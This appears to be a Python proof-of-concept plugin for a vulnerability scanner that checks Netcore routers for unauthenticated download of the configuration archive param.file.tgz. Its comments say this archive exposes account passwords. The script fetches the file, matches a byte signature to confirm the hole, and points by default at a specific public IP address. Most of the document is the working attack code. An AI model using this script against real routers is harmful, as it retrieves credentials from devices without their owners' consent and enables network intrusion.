#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  : NETCORE 未授权访问 下载配置文件查看密码
Author    :  a
mail      :  a@lcx.cc
refer     :  http://wooyun.org/bugs/wooyun-2015-0122195

hex可以看到账号密码 等信息

"""
import urlparse
import time

def assign(service, arg):
    if service == 'netcore':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
     
    payload="param.file.tgz"
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if code == 200 and '\x37\x39\x2F\x2A\x74\xEE' in res:
        security_hole(target)
    

    

if __name__ == '__main__':
    from dummy import *
    audit(assign('netcore', 'http://211.22.230.172:8080/')[1])